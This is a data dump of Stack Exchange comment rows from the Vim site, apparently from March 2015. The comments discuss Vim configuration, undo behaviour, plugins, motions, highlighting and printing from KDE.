  <row Id="2154" PostId="2374" Score="0" Text="Thanks for the link to c.vim!" CreationDate="2015-03-05T12:05:33.057" UserId="1111" />
  <row Id="2155" PostId="2366" Score="1" Text="@ChristianBrabandt That is very clever.  I never thought of you using `v:searchforward` as an index." CreationDate="2015-03-05T12:40:26.933" UserId="865" />
  <row Id="2156" PostId="2376" Score="2" Text="There is probably something in your vimrc that does this. I can't replicate it, and can't find anything in the `:help` files about it ... See: [How do I debug my vimrc file?](https://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file?s=1|1.0009)... Also, using `&lt;C-c&gt;` to exit insert mode may have side-effects ([see this](http://stackoverflow.com/questions/5030164/whats-the-difference-between-ctrlc-and-ctrl/5036294#5036294)) and *may* be part of the problem ... I would suggest using `Esc` or `&lt;C-[&gt;` ([see this](http://vi.stackexchange.com/q/300/51))" CreationDate="2015-03-05T13:07:21.587" UserId="51" />
  <row Id="2157" PostId="2370" Score="0" Text="Okay :-) If you post a small snippet from a vimrc, you should probably test it, just to make sure that a) you can still reproduce the problem with it, and b) there are no errors in it :-) You can use `vim -u test-vimrc.vim` to use a different vimrc file." CreationDate="2015-03-05T13:15:34.360" UserId="51" />
  <row Id="2158" PostId="2374" Score="0" Text="I guess the tag should be more &quot;how do I install plugins&quot; that &quot;plugin-foobar&quot;." CreationDate="2015-03-05T13:43:12.653" UserId="626" />
  <row Id="2159" PostId="2375" Score="0" Text="It looks like there is actually a `~/.vim/doc/csupport.vim` file, so the first suggestion should be sufficient. There's definitely a lot of litter from this installation, though." CreationDate="2015-03-05T15:20:47.700" UserId="64" />
  <row Id="2160" PostId="2375" Score="0" Text="That's odd. I don't see it (neither in the official zip, nor on the github repo -- I'm not using c-support but another suite for C++ programming, thus this file may be auto-generated which could explain why I don't see it). I see a `&lt;localleader&gt;hp` mapping that builds the help database though." CreationDate="2015-03-05T15:39:07.547" UserId="626" />
  <row Id="2161" PostId="2377" Score="3" Text="Only problem is, you don't foresee that you are going to be undoing later (otherwise you won't be doing it in the first place). So you usually end up with a situation where you _wish_ you had used `&lt;C-G&gt;u`, which is too late already." CreationDate="2015-03-05T15:40:05.820" UserId="850" />
  <row Id="2162" PostId="2377" Score="0" Text="Of course. Luckily Vim has an arsenal of editing commands, so you don't have to rely on undo alone :)" CreationDate="2015-03-05T15:41:15.277" UserId="64" />
  <row Id="2163" PostId="2377" Score="3" Text="Yes. Actually something I have been missing myself is this. Sometimes I do this `i` followed by long sentence followed by backspace to remove part of what I have written (all in insert mode). Then I realize I shouldn't have backspaced and what I had written was fine. I undo, but then the whole inserted text gets undone. So either I am left with none of the long sentence, or the part that is not backspaced. It's impossible to get the backspaced part back. Is there a way to tell vim to break the undo sequence upon backspace? (Now that I say it, `map`ing backspace is an option of course)." CreationDate="2015-03-05T15:46:39.840" UserId="850" />
  <row Id="2164" PostId="2375" Score="0" Text="Oops, I meant `~/.vim/doc/csupport.txt`. I didn't check the link, but I see it in the directory tree provided in the question." CreationDate="2015-03-05T15:49:01.393" UserId="64" />
  <row Id="2165" PostId="2368" Score="1" Text="Side note: very useful for programmers is also `[[` and `]]` (as well as `[]` and `][`) to jump between beginning (and end) of functions." CreationDate="2015-03-05T15:53:24.730" UserId="850" />
  <row Id="2166" PostId="2378" Score="0" Text="Does your solution have to use public github repos or are private and/or self-hosted repos fine?" CreationDate="2015-03-05T16:06:15.567" UserId="7" />
  <row Id="2168" PostId="2375" Score="0" Text="Thanks. `:helptags ~/.vim/doc` worked for me!" CreationDate="2015-03-05T16:43:32.257" UserId="1168" />
  <row Id="2169" PostId="2375" Score="0" Text="Also what is it you use instead of c-support?" CreationDate="2015-03-05T16:48:49.150" UserId="1168" />
  <row Id="2170" PostId="2374" Score="0" Text="@elyashiv I only had `syntax on` and `set number`. Sorry i'm a bit late to replying! :)" CreationDate="2015-03-05T18:10:07.283" UserId="1168" />
  <row Id="2171" PostId="2378" Score="0" Text="I'd like to have it in public place, except the small fragments with passwords of course." CreationDate="2015-03-05T18:16:45.353" UserId="1067" />
  <row Id="2172" PostId="2377" Score="0" Text="Edited my answer to include a script to achieve the behaviour you described :)" CreationDate="2015-03-05T18:26:49.450" UserId="64" />
  <row Id="2173" PostId="2383" Score="0" Text="What would those consequences be? Dire?" CreationDate="2015-03-05T19:58:54.560" UserId="205" />
  <row Id="2174" PostId="2383" Score="0" Text="`encoding` is the internal encoding used for text strings everywhere in vim, so you cannot have any variables set that include characters not in the character set, load any files with characters it doesn't support, etc. Changing it mid-stream changes the meaning of any existing non-ascii values (including the contents of file buffers)." CreationDate="2015-03-05T20:00:16.770" UserId="880" />
  <row Id="2175" PostId="2383" Score="0" Text="Interesting! Could you add that to the answer as well?" CreationDate="2015-03-05T20:01:07.370" UserId="205" />
  <row Id="2176" PostId="2381" Score="0" Text="This could be a bug." CreationDate="2015-03-05T20:22:45.700" UserId="71" />
  <row Id="2177" PostId="2380" Score="0" Text="Are you using MacVim? Or Vim from a terminal?" CreationDate="2015-03-05T20:23:31.500" UserId="51" />
  <row Id="2178" PostId="2380" Score="0" Text="I am using terminal." CreationDate="2015-03-05T20:23:52.440" UserId="1168" />
  <row Id="2179" PostId="2381" Score="1" Text="I checked it in the source. This is done on purpose to make fillchars visible. Don't think there is a way around. I would probably make the statusline bold or use underline highlighting" CreationDate="2015-03-05T21:26:14.867" UserId="71" />
  <row Id="2180" PostId="2375" Score="1" Text="I'm using a suite of several plugins that I'm maintaining (https://code.google.com/p/lh-vim/wiki/lhCpp), some being poorly documented. This topic is not the best place to describe my suite." CreationDate="2015-03-05T21:41:01.213" UserId="626" />
  <row Id="2181" PostId="2200" Score="0" Text="Thanks for sharing this @LucHermitte. I've just updated the question to explain that I need to do this within an omni-completion script. Since I cannot change the context of the window, I don't think that this will work, right? Even trying to restore the window context through `pop` seems to fail." CreationDate="2015-03-05T21:51:39.257" UserId="599" />
  <row Id="2182" PostId="2200" Score="0" Text="OK. I've updated my answer." CreationDate="2015-03-05T21:57:36.087" UserId="626" />
  <row Id="2183" PostId="2384" Score="0" Text="Thanks. Will have a look tomorrow." CreationDate="2015-03-05T21:58:16.683" UserId="1168" />
  <row Id="2184" PostId="2382" Score="0" Text="You'll have to patch the templates coming from c-support or use another plugin which will propose other snippets." CreationDate="2015-03-05T21:59:01.853" UserId="626" />
  <row Id="2185" PostId="2377" Score="0" Text="So...any idea how OP ended up with the &quot;undo one character insertion&quot; behavior?" CreationDate="2015-03-06T02:10:18.687" UserId="1060" />
  <row Id="2186" PostId="2377" Score="0" Text="I'm guessing it's some mapping or autocmd in his vimrc. I'm not aware of a setting in Vim for such a thing." CreationDate="2015-03-06T02:12:50.447" UserId="64" />
  <row Id="2189" PostId="2377" Score="0" Text="Awesome! Am I permitted to copy?" CreationDate="2015-03-06T10:52:52.467" UserId="850" />
  <row Id="2190" PostId="2377" Score="1" Text="For future visitors, I also added `inoremap &lt;CR&gt; &lt;C-G&gt;u&lt;CR&gt;` so that each undo is contained within a single line (no more undoing the whole paragraph that you were typing nonstop)." CreationDate="2015-03-06T11:06:47.380" UserId="850" />
  <row Id="2191" PostId="2200" Score="0" Text="in my opinion the code you copied is not very helpful for the answer when compared to everything else and occupies much more area. Maybe you could keep only the link and leave the code out?" CreationDate="2015-03-06T11:11:57.923" UserId="599" />
  <row Id="2192" PostId="2394" Score="7" Text="I'm voting to close this question as off-topic because it is about the configuration of the Windows operating system." CreationDate="2015-03-06T11:28:53.203" UserId="13" />
  <row Id="2193" PostId="2382" Score="0" Text="Thanks, I have tried looking at the templates but I cannot find the one I like. Do you know where it is?" CreationDate="2015-03-06T11:32:56.173" UserId="1168" />
  <row Id="2194" PostId="2389" Score="0" Text="Oh well, Looks like I will map ll to / then. Thanks." CreationDate="2015-03-06T11:37:20.903" UserId="1168" />
  <row Id="2195" PostId="2382" Score="0" Text="IIRC, the documentation explains how to override a template. Search for &quot;local template&quot;. NB: You can also hack in to the templates packaged but it won't be a good idea." CreationDate="2015-03-06T12:28:55.130" UserId="626" />
  <row Id="2196" PostId="2200" Score="1" Text="That what I do usually, but SE policies don't appear as very tolerant towards link..." CreationDate="2015-03-06T12:30:35.727" UserId="626" />
  <row Id="2197" PostId="2394" Score="3" Text="http://superuser.com/a/13947/334516 - apparently someone got the answer from the Vim Wikia. :D" CreationDate="2015-03-06T12:44:13.463" UserId="205" />
  <row Id="2198" PostId="2347" Score="2" Text="Expanding on @Carpetsmoker's comment, beware that automatic `;` insertion could even be dangerous if it is not perfect (and no code is perfect).  Imagine the following confusing set of lines: `if (this &gt; is` followed by `&amp;&amp; a + /* check */` followed by `that * is_very(important |` followed by `security | wise))` followed by `do_something();`. If your automatic `;` insertion makes a mistake and puts a `;` at the end of the `if`, then you immediately get a hard-to-detect security bug." CreationDate="2015-03-06T13:23:22.477" UserId="850" />
  <row Id="2199" PostId="2348" Score="0" Text="First, see [my comment on the question](http://vi.stackexchange.com/questions/2347/how-do-i-automatically-add-a-character-at-end-of-line#comment2198_2347). That said, they very minimum you should do to bypass any trivial bugs is to **try not to parse with regexes**. Regexes are not powerful enough to parse a context-free grammar such as C's. That is assuming no macro wizardry either." CreationDate="2015-03-06T13:26:36.320" UserId="850" />
  <row Id="2200" PostId="2347" Score="1" Text="Furthermore, sometimes this is even impossible to know without actually trying to compile the code. Imagine someone doing this for whatever strange reason: `#define UNTIL(x) while (!(x))`. Then when you write `UNTIL(out_of_bounds)`, it's impossible to know if that's a function call and therefore needs a terminating `;` or a macro that expands to `while` and therefore doesn't need a terminating `;`. If you do insert the `;`, you are in trouble." CreationDate="2015-03-06T13:29:44.717" UserId="850" />
  <row Id="2201" PostId="2347" Score="2" Text="In short, if it were possible to unambiguously understand where there should be a `;`, they wouldn't have added `;` to the language now, would they? ;) Since that's not possible, you can't have a program that correctly inserts it for you either." CreationDate="2015-03-06T13:31:35.807" UserId="850" />
  <row Id="2202" PostId="2347" Score="0" Text="Looks like I wont use this then unless I tell the script to **only** insert at the end of line with the conditions. Thanks for letting me know!" CreationDate="2015-03-06T13:31:54.180" UserId="1168" />
  <row Id="2203" PostId="2388" Score="0" Text="well, it does say the error is in the `viminfo`..." CreationDate="2015-03-06T14:20:40.147" UserId="342" />
  <row Id="2205" PostId="2385" Score="0" Text="I use various background colors for terminals that all rely on the same .vimrc, so unfortunately setting a specific color wouldn't be any better (unless I can set it to &quot;whatever is being used for the bg&quot;). &#xA;&#xA;Looks like I'll just have to settle for bold or underlined then." CreationDate="2015-03-06T15:52:18.070" UserId="1166" />
  <row Id="2206" PostId="2396" Score="1" Text="The output actually makes me think you have a double-quoting issue. For debugging purposes, it may be useful for you to edit vimdiff.bat and remove the @echo off line at the top. Then edit the question with the output of running vimdiff, which should hopefully provide more details about where in the batch file the problem happens." CreationDate="2015-03-06T17:01:53.910" UserId="72" />
  <row Id="2207" PostId="2393" Score="0" Text="I have +1ed your comment since it is useful to know however I have not marked this as the answer because it is not automatically adding a semicolon to the end of the line. Thanks for the suggestion though." CreationDate="2015-03-06T17:46:55.867" UserId="1168" />
  <row Id="2209" PostId="2399" Score="2" Text="Have you ever tried https://github.com/gmarik/Vundle.vim or https://github.com/tpope/vim-pathogen?" CreationDate="2015-03-06T18:13:09.253" UserId="865" />
  <row Id="2211" PostId="2394" Score="2" Text="This is a useful question as such, but I agree with @toro2k that this question belongs on SuperUser.com. It has almost nothing to do with Vim." CreationDate="2015-03-06T19:44:34.007" UserId="51" />
  <row Id="2212" PostId="2399" Score="0" Text="No I haven't. Only started using vim 1-2 days ago." CreationDate="2015-03-06T20:33:20.467" UserId="1168" />
  <row Id="2213" PostId="2388" Score="0" Text="It does, but it says `viminfo`, not `.viminfo` or `~/.viminfo`, so as someone who didn't even know that that file existed, it looked more like a generic tag than a filename." CreationDate="2015-03-06T21:12:53.397" UserId="1079" />
  <row Id="2214" PostId="2385" Score="0" Text="&quot;whatever is being used for the bg&quot; That is possible. Use 'ctermbg=bg' this works, if your Vim knows the current bg color otherwise you might get an error." CreationDate="2015-03-06T21:35:26.950" UserId="71" />
  <row Id="2215" PostId="2396" Score="0" Text="How exactly are you invoking vimdiff, as well? Also see http://superuser.com/questions/697847/cant-run-vimdiff-7-4-on-windows-7" CreationDate="2015-03-06T23:30:57.937" UserId="1094" />
  <row Id="2216" PostId="2395" Score="0" Text="I think you can also use regedit to add these to your own personal area, without admin rights. See http://vim.wikia.com/wiki/Windows_file_associations" CreationDate="2015-03-06T23:46:32.120" UserId="1094" />
  <row Id="2217" PostId="2398" Score="0" Text="Awesome! These solutions work perfect." CreationDate="2015-03-07T01:35:26.847" UserId="544" />
  <row Id="2219" PostId="2403" Score="2" Text="*&quot;How come an unmaintained plugin is the only choice at the moment for code completion for such an important programming language*&quot; -&gt; There are almost no Python 3-only projects, almost all Python programs run fine on Python 2 &amp; 3, so Python 2 completion should be good for almost everyone." CreationDate="2015-03-07T04:31:31.887" UserId="51" />
  <row Id="2220" PostId="2403" Score="0" Text="Agreed with @Carpetsmoker. Vim comes with Python completion out of the box, and it works wonders with Python3 as well. In fact, the default pythoncomplete that comes built in to Vim is what I use. No YCM, no Jedi-vim, no Python-mode. See my answer if you still want +python3" CreationDate="2015-03-07T04:44:14.970" UserId="246" />
  <row Id="2221" PostId="2404" Score="0" Text="Thanks for your quick answer. I was able to build vim with +python3/dyn and +python/dyn support. But that does not solve my problem. As soon as I start vim, YouCompleteMe starts (which always starts python2 as far as I know). When I enter `:echo has('python3')` I get `0`, whereas `:echo has('python')` returns `1`. I have the following options in my .vimrc, but they don't help: `let g:ycm_path_to_python_interpreter = '/usr/bin/python3 let g:ycm_filetype_specific_completion_to_disable = { 'python' : 1 } let g:ycm_filetype_blacklist = { 'python' : 1 }`." CreationDate="2015-03-07T05:41:45.190" UserId="1256" />
  <row Id="2222" PostId="2403" Score="0" Text="I just checked out pythoncomplete, I didn't know that this script is included in a normal vim installation. That is definetely a nice basic option. Do you happen to know an easy way for pythoncomplete to add brackets to functions call (e.g. print(''))?" CreationDate="2015-03-07T06:05:25.570" UserId="1256" />
  <row Id="2223" PostId="2285" Score="2" Text="Try `:keeppatterns` to prevent overriding `@/`. And also take a look at `:keepjumps`." CreationDate="2015-03-07T06:14:13.823" UserId="1242" />
  <row Id="2224" PostId="2403" Score="0" Text="I think you would have to modify that yourself. The source is available here on vim.org: http://www.vim.org/scripts/script.php?script_id=1542. Admittedly, it is pretty old, but it works pretty well for me." CreationDate="2015-03-07T09:12:38.893" UserId="246" />
  <row Id="2225" PostId="2404" Score="0" Text="For step 1, I recommend instead: `apt-get build-dep vim`" CreationDate="2015-03-07T11:21:03.243" UserId="24" />
  <row Id="2226" PostId="2404" Score="0" Text="@200_success, I'm not sure if that also pulls down the x11 stuff needed for clipboard support. I don't have a linux machine with me to check though." CreationDate="2015-03-07T11:24:18.673" UserId="246" />
  <row Id="2227" PostId="2404" Score="0" Text="From https://packages.debian.org/jessie/vim, see the `.dsc` file linked in the sidebar. I believe all of the packages you suggested, except `mercurial`, are either directly or transitively listed as `Build-Depends`. In particular, [`libgnomeui-dev`](https://packages.debian.org/jessie/libgnomeui-dev) is  probably responsible for many of those dependencies." CreationDate="2015-03-07T11:37:51.037" UserId="24" />
  <row Id="2228" PostId="2404" Score="0" Text="@200_success, fair enough, thanks! Updated the post." CreationDate="2015-03-07T11:41:52.993" UserId="246" />
  <row Id="2229" PostId="2403" Score="0" Text="https://github.com/klen/python-mode" CreationDate="2015-03-07T14:21:30.407" UserId="1262" />
  <row Id="2230" PostId="2382" Score="0" Text="I have looked at the local template in search however I am not sure what to do. Could you give me the instructions please?" CreationDate="2015-03-07T15:44:50.067" UserId="1168" />
  <row Id="2233" PostId="2396" Score="0" Text="@JoshPetrie I don't have a diff.bat file, just a diff.exe and a few .vim and .txt files." CreationDate="2015-03-07T17:08:03.363" UserId="342" />
  <row Id="2234" PostId="2413" Score="0" Text="If you do this a lout you can create a key binding." CreationDate="2015-03-07T17:24:46.480" UserId="342" />
  <row Id="2235" PostId="2418" Score="0" Text="(t)csh alias: `alias vimhelp 'vim -c ':help $1' -c :only'`" CreationDate="2015-03-07T17:51:39.633" UserId="51" />
  <row Id="2236" PostId="2418" Score="3" Text="@Carpetsmoker Did you find a time machine to go back to the late 1980s/early 1990s, the time when tcsh was worth using? Can you share?" CreationDate="2015-03-07T17:53:11.313" UserId="8" />
  <row Id="2237" PostId="2413" Score="2" Text="In this literal example, it seems easiest to me to do `}i`, which is &quot;go to the end of the paragraph&quot; and &quot;enter insert mode&quot;. But in general, I would do `]}o` as you mention, because in the midst of coding I often don't mind the (one) extra keystroke if I spend 0 seconds thinking about it." CreationDate="2015-03-07T18:08:36.770" UserId="130" />
  <row Id="2239" PostId="2419" Score="0" Text="Are you using Vim from a terminal? Control+S is also a special keybind picked up by the terminal which means &quot;stop output&quot;... When I try the above 2 keybinds from gVim, it seems to work." CreationDate="2015-03-07T18:45:33.803" UserId="51" />
  <row Id="2240" PostId="2419" Score="0" Text="'`I am also running vim inside the Mac terminal.`' Yes I am running vim via terminal. Would it be better using Alt instead of Ctrl or Cmd?" CreationDate="2015-03-07T18:50:19.390" UserId="1168" />
  <row Id="2241" PostId="2419" Score="0" Text="[This question has been asked many times](https://duckduckgo.com/?q=Vim%20Mapping%20Ctrl%2Bs%20does%20not%20work), by the way ;-) I don't have time to write an answer, but that link should help you..." CreationDate="2015-03-07T18:54:14.060" UserId="51" />
  <row Id="2242" PostId="2421" Score="0" Text="`This is a bug in Vim;`  Actually, it's a bug in the _vimrc being installed by your installer.  At a guess, that's probably the [Vim without Cream](http://sourceforge.net/projects/cream/files/Vim/) installer.  The problem should be reported there." CreationDate="2015-03-07T20:15:02.803" UserId="15" />
  <row Id="2243" PostId="2421" Score="0" Text="@jamessan I downloaded the Vim installer from the vim.org site at http://www.vim.org/download.php ... I don't know anything about Cream. It seems to me that the `_vimrc` file that this installer installs is part of Vim?" CreationDate="2015-03-07T20:22:06.507" UserId="51" />
  <row Id="2244" PostId="2382" Score="0" Text="Sorry. I can't do more. So far, I've just grasped hints of a solution from the documentation -- and the way template expander could be implemented. As I said  in another Q/A, I'm not using c-support as I'm maintaining a concurrent C++ suite -- which would expand `main&lt;c-space&gt;` into something closer to what you are looking for, and if not, this time I'll know how to override `cpp/main` snippet." CreationDate="2015-03-07T20:59:22.737" UserId="626" />
  <row Id="2246" PostId="2421" Score="0" Text="Ah, well that's why it's generally recommended to get the 'Vim without Cream' installer on Windows. :) It is regularly rebuilt whereas the Windows installer from vim.org is usually only built for major releases.  This bug was fixed in 2013, but the vim.org installer doesn't have the fix." CreationDate="2015-03-07T23:40:20.520" UserId="15" />
  <row Id="2247" PostId="2414" Score="0" Text="Why not `z]a}`?" CreationDate="2015-03-08T05:23:29.360" UserId="15" />
  <row Id="2248" PostId="2424" Score="0" Text="If there is no need for a `MyDiff` function, why does it exist?" CreationDate="2015-03-08T06:42:22.153" UserId="342" />
  <row Id="2249" PostId="531" Score="0" Text="EasyMotion is absolutely mindblowing!" CreationDate="2015-03-08T10:32:04.400" UserId="1056" />
  <row Id="2250" PostId="2419" Score="0" Text="To bind save to Cmd-S on OSX you could try mapping from `&lt;D-s&gt;` although I'm not sure if that works in terminal Vim, and it is already a default in MacVim anyway!" CreationDate="2015-03-08T10:41:10.233" UserId="630" />
  <row Id="2251" PostId="2414" Score="0" Text="Because `a}` is a characterwise motion. The operators will work like `i` / `a` for characterwise, and `o` / `O` for linewise. You could use `z]Va}` to force `a}` to be linewise." CreationDate="2015-03-08T14:13:01.357" UserId="64" />
  <row Id="2253" PostId="2428" Score="2" Text="It appears that ctrlp can accept a custom matching function.  It is in the documentation under `'g:ctrlp_match_func`  A good example of this in use is this plugin: http://www.vim.org/scripts/script.php?script_id=4884" CreationDate="2015-03-08T16:47:55.453" UserId="865" />
  <row Id="2254" PostId="2135" Score="4" Text="@MattBoehm That patch was applied upstream as 7.4.658. :)" CreationDate="2015-03-08T17:52:27.083" UserId="15" />
  <row Id="2255" PostId="2358" Score="0" Text="I'm planning to add such a feature to [vimtex](https://github.com/lervag/vimtex), based on the dictionary completion as used by for instance `latex-suite`. `vimtex` is a relatively new plugin and is based on LaTeX-Box, so it should feel somewhat familiar." CreationDate="2015-03-08T17:55:27.957" UserId="21" />
  <row Id="2257" PostId="2418" Score="0" Text="@Gilles some people still post questions about it on AU/U&amp;L - corporate environments, I suppose. :(" CreationDate="2015-03-08T18:33:20.190" UserId="205" />
  <row Id="2258" PostId="2429" Score="0" Text="&quot;a file&quot;? Which file? The one in the current buffer? A file somewhere in the search path?" CreationDate="2015-03-08T22:12:44.863" UserId="205" />
  <row Id="2260" PostId="2429" Score="0" Text="The file that the user open via `vim &lt;file name&gt;" CreationDate="2015-03-08T22:35:50.340" UserId="1168" />
  <row Id="2261" PostId="2429" Score="0" Text="possible duplicate of [How can I see the full path of the current file?](http://vi.stackexchange.com/questions/104/how-can-i-see-the-full-path-of-the-current-file)" CreationDate="2015-03-08T22:37:20.630" UserId="51" />
  <row Id="2262" PostId="2429" Score="0" Text="I don't want the full path. I only want the name and extension of the file. Not the path I also want to use this in vimscript." CreationDate="2015-03-08T22:40:02.643" UserId="1168" />
  <row Id="2263" PostId="2429" Score="0" Text="Yes, both answers are actually in the linked question (specifically, CharlesL's answer)..." CreationDate="2015-03-09T00:32:11.697" UserId="51" />
  <row Id="2264" PostId="2433" Score="2" Text="Thank you. So I guess the fastest way to do this is `vim .`." CreationDate="2015-03-09T01:10:04.520" UserId="356" />
  <row Id="2266" PostId="2434" Score="0" Text="@Carpetsmoker I don't totally understand my [link](http://vim.wikia.com/wiki/Printing_using_kprinter) above, but I thought perhaps that it was piping the &quot;hardcopy&quot; postscript file to KDE's print interface. Hence, I thought that my question wasn't so much about Vim being compatible with KDE, but more about finding the right KDE component to receive the hardcopy." CreationDate="2015-03-09T02:23:44.603" UserId="1278" />
  <row Id="2268" PostId="2435" Score="0" Text="Seems like a reasonable solution (+1), but is there no solution with the core (or semi-core) KDE packages? I read that [kprinter](https://liquidat.wordpress.com/2014/02/18/kprinter-available-for-kde-4/) has been replaced by a qt/kde-specific program, but presumably my gtk apps use another frontend." CreationDate="2015-03-09T02:43:07.377" UserId="1278" />
  <row Id="2269" PostId="2435" Score="0" Text="I think the answer is that there isn't a native way. What I had read was that the kprinter program was replaced by the built-in qt printer dialog (i.e. a function call that can be made from within a program that uses qt). That transition resulted in the removal of the stand-alone program `kprinter`. There is some info and discussion at the following link (which then links to what I posted in the answer) https://liquidat.wordpress.com/2014/02/18/kprinter-available-for-kde-4/" CreationDate="2015-03-09T02:49:02.413" UserId="227" />
  <row Id="2270" PostId="2435" Score="0" Text="We linked to the same thing! :) Okay, I'll leave the question up for a little while anyway, and I'll accept your answer if I don't hear anything better." CreationDate="2015-03-09T03:02:51.370" UserId="1278" />
  <row Id="2271" PostId="2435" Score="0" Text="@Sparhawk Hah, indeed. I missed the link when I first read your comment and posted mine. Anyway, I've just added build and vimrc instructions to make my answer more complete (and less of a link-only answer). That still doesn't help you find a built-in solution, but hopefully it helps others looking for this." CreationDate="2015-03-09T03:24:17.203" UserId="227" />
  <row Id="2272" PostId="2435" Score="0" Text="No worries. Thanks for the instructions; they are so clear! I'm using Arch, so I'd do it via a PKGBUILD, which has it's own… peculiarities, but your instructions look very helpful. BTW, are you using Ubuntu? Do you know if there's a way to pipe hardcopy to its native print dialogue? If so, I wonder if I could co-opt a different DE's print frontend… (which I was implying with my first comment)." CreationDate="2015-03-09T03:28:35.030" UserId="1278" />
  <row Id="2273" PostId="2435" Score="0" Text="@Sparhawk As you guess, I am running Ubuntu 14.04 at the moment. I don't have my Arch machine handy. Any DE with a standalone print front-end program would work similar to kprinter/kprinter4. I couldn't find a standalone &quot;native&quot; dialog for Ubuntu. I did find a package for Ubuntu called `gpr` which is a gnome-ish print dialog like kprinter that is used similarly. Unfortunately, it gives me a PPD error every time I try to use it. Worse, it doesn't seem available for Arch (I don't see it listed at https://www.archlinux.org/packages/)." CreationDate="2015-03-09T03:36:54.970" UserId="227" />
  <row Id="2275" PostId="2429" Score="0" Text="It is because I thought expand meant expand the path. Eg ~/ would become /users/name" CreationDate="2015-03-09T07:37:06.533" UserId="1168" />
  <row Id="2276" PostId="2377" Score="0" Text="@tommcdo, so, am I permitted to copy?" CreationDate="2015-03-09T12:01:59.707" UserId="850" />
  <row Id="2277" PostId="2377" Score="1" Text="@Shahbaz, absolutely :)" CreationDate="2015-03-09T12:14:05.453" UserId="64" />
  <row Id="2278" PostId="2444" Score="3" Text="This isn't a bug.  `ge` goes to the end of the last word, so it would also delete the end of the last word." CreationDate="2015-03-09T13:09:23.773" UserId="865" />
  <row Id="2279" PostId="2434" Score="0" Text="kprinter was removed from the KDE4 source, and someone published a clone: https://github.com/credativ/kprinter4" CreationDate="2015-03-09T13:42:44.487" UserId="205" />
  <row Id="2280" PostId="2444" Score="2" Text="Just use `b` instead." CreationDate="2015-03-09T13:54:27.347" UserId="88" />
  <row Id="2281" PostId="2444" Score="0" Text="@EvergreenTree, what for would i want to delete the last letter of the previous word?  By the way, `dw` does not delete the first letter of the following word." CreationDate="2015-03-09T14:13:54.760" UserId="1248" />
  <row Id="2282" PostId="2444" Score="0" Text="@Doorknob, `b` deletes to the beginning of the previous word.  My question is about `ge`.  My usecase is an operation on what goes *after* the previous word." CreationDate="2015-03-09T14:16:10.607" UserId="1248" />
  <row Id="2283" PostId="2434" Score="0" Text="@muru Yes, I think that's the same one that John O'M. mentioned in his [answer](http://vi.stackexchange.com/a/2435/1278) below." CreationDate="2015-03-09T14:19:29.690" UserId="1278" />
  <row Id="2284" PostId="2435" Score="0" Text="Ah ok. I thought perhaps the Gnome, XFCE or LXDE printer frontends might be options. And I still don't know what non-Qt apps use in KDE." CreationDate="2015-03-09T14:21:13.100" UserId="1278" />
  <row Id="2285" PostId="2434" Score="0" Text="Ah, I didn't see that answer. I came across this in the review queue." CreationDate="2015-03-09T14:24:09.327" UserId="205" />
  <row Id="2286" PostId="2370" Score="0" Text="I have the same problem, and it appears to be a bug. I've posted [here](http://vi.stackexchange.com/questions/2370/vimwiki-cant-fold-list-items) a request to help to solve the bug." CreationDate="2015-03-07T01:44:20.933" UserId="1254" />
  <row Id="2287" PostId="2435" Score="0" Text="@Sparhawk you could use gtklp, there are other printer frontends. But they have a different interface (at least slightly) than the KDE one." CreationDate="2015-03-09T14:55:27.780" UserId="31" />
  <row Id="2288" PostId="2135" Score="0" Text="@jamessan Excellent, thank you!" CreationDate="2015-03-09T15:08:15.773" UserId="680" />
  <row Id="2289" PostId="543" Score="1" Text="Just use a plugin manager like neobundle." CreationDate="2015-03-09T15:12:40.433" UserId="944" />
  <row Id="2290" PostId="2444" Score="2" Text="`wW` and `bB` are &quot;exclusive&quot; motions but `eE` and `gegE` are &quot;inclusive&quot; motions. See `:h exclusive`." CreationDate="2015-03-09T17:05:49.357" UserId="54" />
  <row Id="2293" PostId="2444" Score="0" Text="Thanks for making me read help more carefully, @romainl.  I guess then this is not a bug but a design flaw." CreationDate="2015-03-09T17:16:05.043" UserId="1248" />
  <row Id="2294" PostId="2446" Score="1" Text="But in Vim you can have red underline too." CreationDate="2015-03-09T17:19:06.823" UserId="1248" />
  <row Id="2296" PostId="2448" Score="0" Text="You mean like in dvge? Try it again. It will make it exclusive, but only the character the cursor was originally was on." CreationDate="2015-03-09T17:36:24.390" UserId="71" />
  <row Id="2298" PostId="2448" Score="0" Text="did you use d\ge&#xA;This works for me justfine" CreationDate="2015-03-09T17:39:23.907" UserId="71" />
  <row Id="2301" PostId="2448" Score="0" Text="Ah, that is your problem. You also want this to be excluded? I'll update the answer" CreationDate="2015-03-09T17:41:28.553" UserId="71" />
  <row Id="2303" PostId="2448" Score="0" Text="starting visual mode" CreationDate="2015-03-09T17:43:53.890" UserId="71" />
  <row Id="2305" PostId="2448" Score="0" Text="I clean up the comments." CreationDate="2015-03-09T17:47:44.427" UserId="1248" />
  <row Id="2306" PostId="2446" Score="0" Text="Thanks @Carpetsmoker. I did look at it but I thought it was for VIM only and it wouldn't show on other text editors such as `TextEdit`. I also wasn't sure if it would display the formatting in VIM. Thanks for confirming it." CreationDate="2015-03-09T17:50:18.363" UserId="1168" />
  <row Id="2307" PostId="2448" Score="0" Text="How about `:onoremap &lt;leader&gt;ge :norm! ge &lt;cr&gt;`? ;)" CreationDate="2015-03-09T17:51:40.320" UserId="1248" />
  <row Id="2308" PostId="2448" Score="0" Text="That won't work, since as soon as you type the ge, the operation will finish and the space comes too late." CreationDate="2015-03-09T17:52:33.710" UserId="71" />
  <row Id="2310" PostId="2448" Score="0" Text="Ah yes you are right" CreationDate="2015-03-09T17:57:24.450" UserId="71" />
  <row Id="2312" PostId="2448" Score="1" Text="In fact, `:onoremap &lt;leader&gt;ge :norm! ge &lt;cr&gt;` already makes both ends exclusive (with default settings)." CreationDate="2015-03-09T18:20:48.547" UserId="1248" />
  <row Id="2313" PostId="2448" Score="1" Text="True. But I can't explain this." CreationDate="2015-03-09T18:23:24.390" UserId="71" />
  <row Id="2314" PostId="2385" Score="0" Text="`:hi StatusLine ctermbg=bg` just gives me `E420: BG color unknown`, unfortunately" CreationDate="2015-03-09T18:29:56.820" UserId="1166" />
  <row Id="2315" PostId="2385" Score="0" Text="What is the definition of the :Normal highlighting group for you?" CreationDate="2015-03-09T18:38:15.220" UserId="71" />
  <row Id="2316" PostId="2385" Score="0" Text="&quot;highlight group not found: Normal&quot;" CreationDate="2015-03-09T18:39:52.773" UserId="1166" />
  <row Id="2317" PostId="2385" Score="0" Text="Strange. There should always be a Normal highlighting group" CreationDate="2015-03-09T18:57:49.870" UserId="71" />
